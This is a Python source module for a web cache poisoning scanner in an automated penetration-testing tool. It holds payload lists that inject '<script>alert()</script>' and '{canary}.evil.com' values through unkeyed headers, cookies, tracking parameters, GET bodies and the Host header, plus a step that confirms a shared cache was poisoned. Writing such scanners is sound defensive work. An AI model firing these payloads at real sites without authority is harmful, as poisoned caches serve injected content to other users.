"""
Jarwis AGI Pen Test - Web Cache Poisoning Scanner
Detects Web Cache Poisoning vulnerabilities (A05:2021 - Security Misconfiguration)

Based on PortSwigger Web Security Academy: https://portswigger.net/web-security/web-cache-poisoning

Attack Techniques:
- Unkeyed header injection (X-Forwarded-Host, X-Original-URL, X-Rewrite-URL)
- Cache key manipulation
- Parameter cloaking
- Fat GET requests
- Cache key normalization exploits
- Response splitting via cache

Web cache poisoning is a sophisticated attack that exploits the behavior of web caches
to serve malicious content to other users. An attacker poisons the cache by crafting
a request that causes the cache to store a harmful response, which is then served to
subsequent users.

Usage:
    scanner = WebCachePoisoningScannerV2(
        http_client=jarwis_http_client,
        request_store=request_store_db,
        checkpoint=checkpoint,
        token_manager=token_manager
    )
    findings = await scanner.run(post_login=False)  # Usually pre-login
"""

import asyncio
import logging
import re
import uuid
import hashlib
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

from attacks.web.base_attack_scanner import (
    BaseAttackScanner,
    Finding,
    Severity,
    Confidence
)
from attacks.payloads.manager import PayloadManager, PayloadCategory
from core.jarwis_http_client import JarwisHTTPClient, AttackResponse
from core.request_store_db import RequestStoreDB, StoredRequest
from core.scan_checkpoint import RequestLevelCheckpoint
from core.token_manager import TokenManager

logger = logging.getLogger(__name__)


class WebCachePoisoningScannerV2(BaseAttackScanner):
    """
    Web Cache Poisoning Scanner (MITM-based)
    
    OWASP A05:2021 - Security Misconfiguration
    CWE-444: Inconsistent Interpretation of HTTP Requests
    
    Attack vectors:
    - Unkeyed HTTP header injection
    - Cache key manipulation
    - Parameter cloaking
    - Fat GET request abuse
    - Host header attacks
    
    All requests go through MITM via JarwisHTTPClient.
    """
    
    # Scanner identification
    scanner_name = "web_cache_poisoning"
    attack_type = "cache_poisoning"
    owasp_category = "A05:2021"
    cwe_id = "CWE-444"
    
    # Cache indicator headers in response
    CACHE_HEADERS = [
        'x-cache', 'x-cache-hits', 'cf-cache-status', 'age', 'cache-control',
        'x-varnish', 'x-drupal-cache', 'x-akamai-transformed', 'x-served-by',
        'x-cache-status', 'x-proxy-cache', 'x-fastly-request-id', 'x-cdn',
        'via', 'x-sucuri-cache', 'x-iinfo', 'x-nc', 'cdn-cache-control',
        'surrogate-control', 'x-amz-cf-id', 'x-amz-cf-pop', 'x-azure-ref',
        'x-vercel-cache', 'x-vercel-id', 'x-cache-status-int', 'x-proxy-cache-status'
    ]
    
    # Cache hit indicators
    CACHE_HIT_PATTERNS = [
        r'hit', r'cached', r'HIT', r'CACHED', r'TCP_HIT', r'MEM_HIT',
        r'STALE', r'REVALIDATED', r'from\s+cache'
    ]
    
    # Unique marker for detection
    CANARY_PREFIX = "jarwispoison"
    
    # =====================================================================
    # Unkeyed Header Payloads - Headers that may be reflected but not cached
    # =====================================================================
    
    UNKEYED_HEADERS = {
        # Forwarded headers - commonly reflected in links/redirects
        'X-Forwarded-Host': '{canary}.evil.com',
        'X-Forwarded-Server': '{canary}.evil.com',
        'X-Forwarded-Scheme': 'http',
        'X-Forwarded-Proto': 'http',
        'X-Forwarded-Port': '443',
        
        # URL rewrite headers - may affect path handling
        'X-Original-URL': '/{canary}',
        'X-Rewrite-URL': '/{canary}',
        'X-Original-Host': '{canary}.evil.com',
        
        # Host override headers
        'X-Host': '{canary}.evil.com',
        'X-HTTP-Host-Override': '{canary}.evil.com',
        
        # Debug/special headers
        'X-Forwarded-Prefix': '/{canary}',
        'X-Original-Path': '/{canary}',
        'X-Real-IP': '127.0.0.1',
        
        # Akamai-specific
        'True-Client-IP': '127.0.0.1',
        'Fastly-Client-IP': '127.0.0.1',
        
        # Cloudflare-specific
        'CF-Connecting-IP': '127.0.0.1',
        
        # AWS/Azure
        'X-Azure-ClientIP': '127.0.0.1',
        'X-Amz-Website-Redirect-Location': 'https://{canary}.evil.com',
    }
    
    # XSS payloads for cache poisoning
    XSS_HEADERS = {
        'X-Forwarded-Host': '<script>alert("{canary}")</script>.evil.com',
        'X-Original-URL': '"><script>alert("{canary}")</script>',
        'X-Forwarded-Prefix': '"><script>alert("{canary}")</script>',
        'X-Host': '"><img src=x onerror=alert("{canary}")>.evil.com',
    }
    
    # Cookie-based cache poisoning
    COOKIE_PAYLOADS = [
        ('language', '"><script>alert("{canary}")</script>'),
        ('country', '"><script>alert("{canary}")</script>'),
        ('currency', '"><script>alert("{canary}")</script>'),
        ('utm_source', '"><script>alert("{canary}")</script>'),
        ('tracking', '"><script>alert("{canary}")</script>'),
    ]
    
    # Parameter cloaking - exploiting parsing differences
    PARAM_CLOAKING_PAYLOADS = [
        # utm_ parameters often excluded from cache key
        ('utm_source', '"><script>alert("{canary}")</script>'),
        ('utm_medium', '"><script>alert("{canary}")</script>'),
        ('utm_campaign', '"><script>alert("{canary}")</script>'),
        ('utm_content', '"><script>alert("{canary}")</script>'),
        
        # Analytics parameters
        ('fbclid', '"><script>alert("{canary}")</script>'),
        ('gclid', '"><script>alert("{canary}")</script>'),
        ('_ga', '"><script>alert("{canary}")</script>'),
        
        # Common excluded params
        ('callback', 'alert'),  # JSONP callback
        ('cb', '{canary}'),
        ('cache', 'false'),
        ('nocache', '1'),
        ('_', '{canary}'),
    ]
    
    # Fat GET request payloads - body in GET requests
    FAT_GET_PAYLOADS = [
        ('{"test": "{canary}"}', 'application/json'),
        ('test={canary}', 'application/x-www-form-urlencoded'),
        ('<test>{canary}</test>', 'text/xml'),
    ]
    
    def __init__(
        self,
        http_client: JarwisHTTPClient,
        request_store: RequestStoreDB,
        checkpoint: Optional[RequestLevelCheckpoint] = None,
        token_manager: Optional[TokenManager] = None,
        config: Optional[Dict[str, Any]] = None
    ):
        super().__init__(http_client, request_store, checkpoint, token_manager, config)
        self._canary = f"{self.CANARY_PREFIX}{uuid.uuid4().hex[:8]}"
        
        # Initialize PayloadManager for external payload loading
        self._payload_manager = PayloadManager()
        self._external_payloads_loaded = False
        self._ext_cache_payloads: List[str] = []
    
    def _load_external_payloads(self) -> None:
        """Lazy-load payloads from external files."""
        if self._external_payloads_loaded:
            return
        
        try:
            self._ext_cache_payloads = self._payload_manager.get_payloads(
                PayloadCategory.CACHE_POISONING, subcategory="all", limit=50
            )
            self._external_payloads_loaded = True
            logger.debug(f"Loaded {len(self._ext_cache_payloads)} cache poisoning payloads from external files")
        except Exception as e:
            logger.warning(f"Failed to load external cache poisoning payloads, using embedded: {e}")
    
    def get_payloads(self) -> List[str]:
        """Return header names for unkeyed header testing. Uses external payloads if available."""
        self._load_external_payloads()
        
        # Prefer external payloads for additional header/payload combinations
        # Fall back to embedded headers
        return list(self.UNKEYED_HEADERS.keys())[:self.max_payloads_per_param]
    
    def is_applicable(self, request: StoredRequest) -> bool:
        """Check if this request should be tested for cache poisoning."""
        # Skip obviously non-cacheable methods
        if request.method.upper() not in ('GET', 'HEAD'):
            return False
        
        # Skip API endpoints (usually not cached)
        if '/api/' in request.url.lower():
            return False
        
        # Skip requests with auth headers (usually not cached)
        auth_headers = ['authorization', 'cookie', 'x-auth-token']
        has_auth = any(h.lower() in [k.lower() for k in request.headers.keys()] for h in auth_headers)
        
        # For now, test all GET requests (we'll detect if cache is present)
        return True
    
    async def scan_request(self, request: StoredRequest) -> List[Finding]:
        """
        Scan a single request for web cache poisoning vulnerabilities.
        
        Attack methodology:
        1. Detect if caching is present
        2. Test unkeyed headers for reflection
        3. Test parameter cloaking
        4. Test fat GET requests
        5. Verify cache poisoning impact
        """
        findings = []
        
        # Get baseline and check for caching
        baseline = await self.send_baseline_request(request)
        if not baseline:
            return findings
        
        # Check if request is cacheable
        is_cached, cache_info = self._detect_caching(baseline)
        
        if not is_cached:
            logger.debug(f"[{self.scanner_name}] No caching detected for {request.url}")
            # Still test - some caches don't reveal themselves
        
        # Test unkeyed headers
        header_finding = await self._test_unkeyed_headers(request, baseline)
        if header_finding:
            findings.append(header_finding)
        
        # Test XSS via cache poisoning
        xss_finding = await self._test_xss_headers(request, baseline)
        if xss_finding:
            findings.append(xss_finding)
        
        # Test parameter cloaking
        param_finding = await self._test_param_cloaking(request, baseline)
        if param_finding:
            findings.append(param_finding)
        
        # Test fat GET requests
        fat_get_finding = await self._test_fat_get(request, baseline)
        if fat_get_finding:
            findings.append(fat_get_finding)
        
        # Test Host header attacks
        host_finding = await self._test_host_header(request, baseline)
        if host_finding:
            findings.append(host_finding)
        
        return findings
    
    def _detect_caching(self, response: AttackResponse) -> Tuple[bool, str]:
        """Detect if caching is present from response headers."""
        if not response.headers:
            return False, ""
        
        headers_lower = {k.lower(): v for k, v in response.headers.items()}
        
        cache_info = []
        
        # Check for cache headers
        for header in self.CACHE_HEADERS:
            if header.lower() in headers_lower:
                value = headers_lower[header.lower()]
                cache_info.append(f"{header}: {value}")
                
                # Check for hit patterns
                for pattern in self.CACHE_HIT_PATTERNS:
                    if re.search(pattern, str(value), re.IGNORECASE):
                        return True, "; ".join(cache_info)
        
        # Check Cache-Control for cacheability
        if 'cache-control' in headers_lower:
            cc = headers_lower['cache-control'].lower()
            if 'public' in cc or 's-maxage' in cc or 'max-age' in cc:
                if 'no-store' not in cc and 'private' not in cc:
                    return True, f"Cache-Control: {headers_lower['cache-control']}"
        
        # Check for Age header (indicates served from cache)
        if 'age' in headers_lower:
            try:
                age = int(headers_lower['age'])
                if age > 0:
                    return True, f"Age: {age}"
            except ValueError:
                pass
        
        return bool(cache_info), "; ".join(cache_info) if cache_info else ""
    
    async def _test_unkeyed_headers(
        self,
        request: StoredRequest,
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test for unkeyed header reflection in cached responses."""
        
        for header_name, payload_template in list(self.UNKEYED_HEADERS.items())[:10]:
            payload = payload_template.format(canary=self._canary)
            
            # Add cache buster to ensure fresh response
            cache_buster = f"cb{uuid.uuid4().hex[:8]}"
            test_url = self._add_cache_buster(request.url, cache_buster)
            
            # Send request with unkeyed header
            modified_headers = dict(request.headers)
            modified_headers[header_name] = payload
            modified_headers['X-Jarwis-Attack'] = '1'
            modified_headers['X-Jarwis-Scanner'] = self.scanner_name
            
            response, error = await self.http_client.send_attack(
                url=test_url,
                method=request.method,
                headers=modified_headers,
                body=request.body,
                scanner_name=self.scanner_name,
                attack_type=self.attack_type,
                original_request_id=request.id,
                payload=f"{header_name}: {payload}",
                payload_location="header",
                parameter_name=header_name
            )
            
            if error or not response:
                continue
            
            # Check if header value is reflected in response
            is_reflected, evidence = self._check_reflection(response, payload, self._canary)
            
            if is_reflected:
                # Verify cache poisoning by making second request without header
                await asyncio.sleep(0.5)
                
                clean_response, _ = await self.http_client.send_attack(
                    url=test_url,
                    method=request.method,
                    headers=request.headers,
                    body=request.body,
                    scanner_name=self.scanner_name,
                    attack_type="cache_verify",
                    original_request_id=request.id
                )
                
                if clean_response:
                    is_poisoned, _ = self._check_reflection(clean_response, payload, self._canary)
                    
                    if is_poisoned:
                        return self.create_finding(
                            request=request,
                            response=response,
                            payload=f"{header_name}: {payload}",
                            evidence=f"CONFIRMED: Cache poisoned! {evidence}. Subsequent requests without header still contain payload.",
                            confidence="confirmed",
                            severity="high",
                            title=f"Web Cache Poisoning via {header_name}",
                            description=(
                                f"The {header_name} header is reflected in the response and the response "
                                f"is cached. An attacker can poison the cache with malicious content that "
                                f"will be served to other users. This can lead to XSS, phishing, or "
                                f"serving malware to all users accessing the cached page."
                            ),
                            parameter=header_name
                        )
                    else:
                        # Reflected but not cached (still interesting)
                        return self.create_finding(
                            request=request,
                            response=response,
                            payload=f"{header_name}: {payload}",
                            evidence=f"Header reflected but not cached. {evidence}",
                            confidence="medium",
                            severity="medium",
                            title=f"Unkeyed Header Reflection ({header_name})",
                            description=(
                                f"The {header_name} header is reflected in the response. While cache "
                                f"poisoning was not confirmed, this could be exploitable if caching "
                                f"conditions change or with different cache configurations."
                            ),
                            parameter=header_name
                        )
        
        return None
    
    async def _test_xss_headers(
        self,
        request: StoredRequest,
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test for XSS via cache poisoning with header injection."""
        
        for header_name, payload_template in self.XSS_HEADERS.items():
            payload = payload_template.format(canary=self._canary)
            
            cache_buster = f"xss{uuid.uuid4().hex[:8]}"
            test_url = self._add_cache_buster(request.url, cache_buster)
            
            modified_headers = dict(request.headers)
            modified_headers[header_name] = payload
            
            response, error = await self.http_client.send_attack(
                url=test_url,
                method=request.method,
                headers=modified_headers,
                body=request.body,
                scanner_name=self.scanner_name,
                attack_type=self.attack_type,
                original_request_id=request.id,
                payload=f"{header_name}: {payload}",
                payload_location="header",
                parameter_name=header_name
            )
            
            if error or not response:
                continue
            
            # Check for unencoded XSS payload in response
            if response.body and '<script>' in response.body and self._canary in response.body:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=f"{header_name}: {payload}",
                    evidence=f"XSS payload reflected unencoded via {header_name} header",
                    confidence="high",
                    severity="high",
                    title=f"XSS via Cache Poisoning ({header_name})",
                    description=(
                        f"An XSS payload injected via the {header_name} header is reflected "
                        f"unencoded in the response. If this response is cached, the XSS will "
                        f"execute for all users accessing the cached page, leading to mass "
                        f"account compromise."
                    ),
                    parameter=header_name
                )
        
        return None
    
    async def _test_param_cloaking(
        self,
        request: StoredRequest,
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test parameter cloaking for cache poisoning."""
        
        for param_name, payload_template in self.PARAM_CLOAKING_PAYLOADS[:5]:
            payload = payload_template.format(canary=self._canary)
            
            # Add the cloaked parameter
            test_url = self._add_param(request.url, param_name, payload)
            
            response, error = await self.http_client.send_attack(
                url=test_url,
                method=request.method,
                headers=request.headers,
                body=request.body,
                scanner_name=self.scanner_name,
                attack_type=self.attack_type,
                original_request_id=request.id,
                payload=f"{param_name}={payload}",
                payload_location="query",
                parameter_name=param_name
            )
            
            if error or not response:
                continue
            
            # Check if payload reflected
            if response.body and self._canary in response.body:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=f"{param_name}={payload}",
                    evidence=f"Parameter {param_name} reflected in response (may be excluded from cache key)",
                    confidence="medium",
                    severity="medium",
                    title=f"Potential Cache Poisoning via {param_name}",
                    description=(
                        f"The {param_name} parameter is reflected in the response. Parameters like "
                        f"utm_*, fbclid, gclid are often excluded from cache keys for analytics "
                        f"purposes, meaning the poisoned response may be served to users without "
                        f"these parameters."
                    ),
                    parameter=param_name
                )
        
        return None
    
    async def _test_fat_get(
        self,
        request: StoredRequest,
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test fat GET request attack (body in GET request)."""
        
        if request.method.upper() != 'GET':
            return None
        
        for body_payload, content_type in self.FAT_GET_PAYLOADS:
            payload = body_payload.format(canary=self._canary)
            
            modified_headers = dict(request.headers)
            modified_headers['Content-Type'] = content_type
            modified_headers['Content-Length'] = str(len(payload))
            
            response, error = await self.http_client.send_attack(
                url=request.url,
                method='GET',
                headers=modified_headers,
                body=payload,
                scanner_name=self.scanner_name,
                attack_type=self.attack_type,
                original_request_id=request.id,
                payload=payload,
                payload_location="body",
                parameter_name="fat_get_body"
            )
            
            if error or not response:
                continue
            
            # Check if body content affects response
            if response.body and self._canary in response.body:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence="Fat GET request body is reflected in response",
                    confidence="medium",
                    severity="medium",
                    title="Fat GET Request Cache Poisoning",
                    description=(
                        "The server processes body content in GET requests and reflects it in "
                        "the response. Since caches typically ignore GET request bodies (they're "
                        "not part of the cache key), an attacker can poison the cache by sending "
                        "a GET request with a malicious body."
                    ),
                    parameter="body"
                )
        
        return None
    
    async def _test_host_header(
        self,
        request: StoredRequest,
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test Host header manipulation for cache poisoning."""
        
        evil_host = f"{self._canary}.evil.com"
        
        modified_headers = dict(request.headers)
        modified_headers['Host'] = evil_host
        
        # Also try with X-Forwarded-Host alongside original Host
        test_configs = [
            {'Host': evil_host},
            {'X-Forwarded-Host': evil_host},
            {'Host': request.headers.get('Host', ''), 'X-Forwarded-Host': evil_host},
        ]
        
        for extra_headers in test_configs:
            test_headers = dict(request.headers)
            test_headers.update(extra_headers)
            
            cache_buster = f"host{uuid.uuid4().hex[:6]}"
            test_url = self._add_cache_buster(request.url, cache_buster)
            
            response, error = await self.http_client.send_attack(
                url=test_url,
                method=request.method,
                headers=test_headers,
                body=request.body,
                scanner_name=self.scanner_name,
                attack_type=self.attack_type,
                original_request_id=request.id,
                payload=str(extra_headers),
                payload_location="header",
                parameter_name="Host"
            )
            
            if error or not response:
                continue
            
            # Check if evil host is reflected
            if response.body and evil_host in response.body:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=str(extra_headers),
                    evidence=f"Host header ({evil_host}) reflected in response body",
                    confidence="high",
                    severity="high",
                    title="Host Header Cache Poisoning",
                    description=(
                        "The Host header is reflected in the response body (likely in links, "
                        "scripts, or redirects). An attacker can poison the cache to redirect "
                        "users to a malicious domain, steal credentials via phishing, or perform "
                        "password reset poisoning attacks."
                    ),
                    parameter="Host"
                )
        
        return None
    
    def _add_cache_buster(self, url: str, value: str) -> str:
        """Add a cache buster parameter to URL."""
        return self._add_param(url, 'cb', value)
    
    def _add_param(self, url: str, name: str, value: str) -> str:
        """Add a parameter to URL."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[name] = [value]
        new_query = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
    
    def _check_reflection(
        self,
        response: AttackResponse,
        payload: str,
        canary: str
    ) -> Tuple[bool, str]:
        """Check if payload/canary is reflected in response."""
        if not response.body:
            return False, ""
        
        body = response.body
        
        # Check for exact canary
        if canary in body:
            # Find context
            idx = body.find(canary)
            start = max(0, idx - 50)
            end = min(len(body), idx + len(canary) + 50)
            context = body[start:end]
            return True, f"Canary reflected at position {idx}: ...{context}..."
        
        # Check for partial payload reflection
        if payload in body:
            return True, f"Full payload reflected in response"
        
        return False, ""
    
    def detect_vulnerability(
        self,
        response: AttackResponse,
        payload: str,
        original_response: Optional[AttackResponse] = None
    ) -> Tuple[bool, str, str]:
        """Analyze response for cache poisoning indicators."""
        if not response.body:
            return False, "", ""
        
        body = response.body
        
        # Check for canary reflection
        if self._canary in body:
            return True, f"Canary {self._canary} found in response", "high"
        
        return False, "", ""


# Alias for backward compatibility
WebCachePoisoningScanner = WebCachePoisoningScannerV2
